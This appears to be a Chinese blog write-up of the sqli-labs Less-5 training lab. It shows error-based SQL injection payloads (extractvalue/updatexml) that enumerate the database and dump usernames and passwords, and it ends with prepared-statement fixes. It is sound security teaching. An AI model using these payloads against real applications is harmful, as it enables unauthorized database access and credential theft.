---
layout: post
title: sqli-labs - Less-5 基于错误的双注入（报错注入）Writeup
platform: sqli-labs
date: 2026-11-10 08:20:00 +0800
categories: CTF
---

sqli-labs - Less-5 基于错误的双注入（报错注入）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-5 → Double Injection - Single Quotes（单引号 + 报错注入）
- 地址：`http://127.0.0.1:8080/Less-5/?id=1`
- 题型：Web / SQL 注入
- 考点：**报错注入（extractvalue）**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（工作区独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
?id=1              → 正常回显
?id=1'             → You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1'
?id=1' and extractvalue(1,concat(0x7e,database())) --+  → XPATH syntax error: '~security'
```

二、题目分析

**① 正常请求长什么样**

```text
http://127.0.0.1:8080/Less-5/?id=1
→ Welcome Dhakkan
→ You are in...........
```

**★ 注意：不管 id 存在不存在，页面只显示 `You are in...........`（成功）或者报错 —— 数据本身不回显。**

**② 源码（关键三行）**

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if ($row) { echo "<font size='5' color= '#99FF00'>You are in...........</font>"; }
else { echo "You have an error in your SQL syntax..."; }
```

**③ 单引号字符型，但页面【不回显数据】，只显示 You are in → 只能报错/盲注**

- 数据不回显 → UNION 联合查询没地方显示
- 但 `mysql_error()` 把错误原样打印 → **可以用报错注入把数据"夹带"出来**

**④ 报错注入原理**

```sql
extractvalue(1, concat(0x7e, (select 要查的东西)))
        │         │
        │         └─ 拼上 ~ 前缀，让报错信息里带上查询结果
        └─ XML 函数，第二个参数必须是合法 XPath
           不合法就报错：XPATH syntax error: '~查询结果'
```

**★ 同类函数还有 `updatexml(1, concat(0x7e,(...)), 1)`，用法完全一样。**

三、解题步骤

**第一步：确认注入点**

```text
?id=1' and 1=1 --+   → You are in...........（正常）
?id=1' and 1=2 --+   → You are in...........（还是正常，因为页面只判断有没有行）
?id=1'                → 报错
```

**★ 因为页面不打印数据，只能从"报错 / 不报错"里偷信息。**

**第二步：爆库（报错注入）**

```text
1' and extractvalue(1,concat(0x7e,database())) --+
→ XPATH syntax error: '~security'
```

**第三步：爆表**

```text
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
→ XPATH syntax error: '~emails,referers,uagents,users'
```

**第四步：爆字段**

```text
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))) --+
→ XPATH syntax error: '~id,username,password'
```

**第五步：爆数据**

```text
1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+
→ XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'（被 32 字节截断，用 limit/substr 分段取）
```

**★ 报错注入一次最多带出 32 个字符，数据长的话用 `limit 0,1` + `substr(...)` 分段取：**

```text
1' and extractvalue(1,concat(0x7e,(select username from users limit 0,1))) --+
1' and extractvalue(1,concat(0x7e,(select substr(password,1,16) from users limit 7,1))) --+
```

四、延伸知识

**① 注释的三种写法**

```text
--+     → URL 里 + 会被解成空格，等价于 "-- "（最常用）
#       → 也可以，但 # 在 URL 里要编码成 %23
/**/    → 行内注释，绕过一些关键字过滤
```

**② 为什么用 `-1` 而不是 `1`**

```text
?id=1' union select 1,2,3 --+   → 主查询先查到 id=1 这行，页面只显示第一行 → 看不到 2、3
?id=-1' union select 1,2,3 --+  → 主查询查不到任何行 → 页面显示 UNION 的结果 → 看到 2、3
```

**③ `information_schema` 是什么**

```text
MySQL 自带的"元数据库"，所有库/表/字段名都记在里面：
  information_schema.tables      → table_schema / table_name
  information_schema.columns     → table_schema / table_name / column_name
★ MySQL 5.0 以上都有，是 SQL 注入里"爆表爆字段"的标配
```

**④ 常见坑：Illegal mix of collations**

```text
UNION 时如果两边字符集排序规则不一致，会报：
Illegal mix of collations for operation 'UNION'

解决：把 information_schema 的列转成目标库的字符集
  convert(group_concat(table_name) using latin1)
```

**⑤ 修复建议（写代码的人该怎么做）**

```php
// ❌ 错误写法
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

// ✅ 正确写法（预处理 + 参数绑定）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->execute([$id]);

// ✅ 或者至少做类型转换（数字型）
$id = intval($_GET['id']);
```

**★ 只要用了预处理，引号、括号、注释这些花招全部失效 —— 本关的注入点就不存在了。**

五、总结

- **本题核心：页面不回显数据 → 用 extractvalue 报错注入把数据夹带出来。**

- 三步方法论：

```text
① 判断闭合方式（' → 报错 → ' + 注释 → 正常）
② 判断列数（order by / union select 1,2,3）
③ 报错注入：extractvalue(1,concat(0x7e,(select ...)))
```

- **三个必记要点**：

```text
① 报错注入不需要回显位，靠 mysql_error() 泄露
② extractvalue 一次最多带 32 字节，长数据要分段
③ information_schema 是爆库爆表的关键
```

- **实测数据**：

```text
库名：security
表名：emails, referers, uagents, users
字段：id, username, password
数据：Dumb:Dumb, Angelina:I-kill-you, ..., admin:admin
```

**手工复现要点**：

```text
· 浏览器直接改 URL 就行，不用抓包
· 先把 ' 加上看报错，再加 --+ 看是否闭合
· 用 order by 猜列数，union select 1,2,3 找显示位
· 依次爆库 → 爆表 → 爆字段 → 爆数据
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  报错注入 = 把查询结果拼进非法 XPath，让 mysql_error 替你打印  │
│                                                        │
│  判断口诀：                                             │
│      '  → 报错 → 说明有注入                            │
│      ' + --+ → 正常 → 说明闭合成功                     │
│                                                        │
│  ★ 修复 = 预处理（参数绑定），一句话解决所有注入           │
└────────────────────────────────────────────────────────┘
```
